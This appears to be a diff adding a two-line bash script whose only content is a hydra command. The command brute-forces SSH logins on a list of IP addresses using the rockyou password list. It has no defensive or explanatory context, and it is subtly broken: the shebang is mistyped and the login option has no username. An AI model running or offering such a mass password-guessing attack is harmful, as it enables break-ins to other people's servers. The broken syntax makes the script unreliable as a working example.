@@ -1,0 +1,2 @@
+#1/bin/bash
+sudo hydra -l -P /usr/share/wordlists/rockyou.txt -M ~/IPs.txt ssh
